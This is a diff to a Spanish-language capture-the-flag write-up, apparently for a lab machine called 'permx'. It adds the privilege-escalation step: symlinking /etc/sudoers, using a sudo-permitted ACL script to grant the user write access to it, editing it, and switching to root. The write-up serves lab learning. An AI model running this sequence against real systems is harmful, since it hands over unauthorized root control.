@@ -82,8 +82,17 @@ enumerando el sistema podemos encontrar otro usuario y establecer la conexión v
 ![[Pasted image 20240712152253.png]]
 
 ### Escalada de privilegios
-tenemos permisos de super usuario para el binario `/opt/acl.sh` este archivo puede ser vulnerable ya que esta haciendo un llamado a `/etc/sudoers`
+tenemos permisos de super usuario para el script `/opt/acl.sh` este archivo puede ser vulnerable ya que esta haciendo un llamado a `/etc/sudoers`
 ![[Pasted image 20240712161909.png]]
 
-### Explotación del binario /opt/
+### Explotación del script /opt/acl.sh
+
+```python
+mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
+mtz@permx:~$ nano sudoers 
+mtz@permx:~$ sudo su
+[sudo] password for mtz: 
+```
+
 ![[Pasted image 20240712162102.png]]
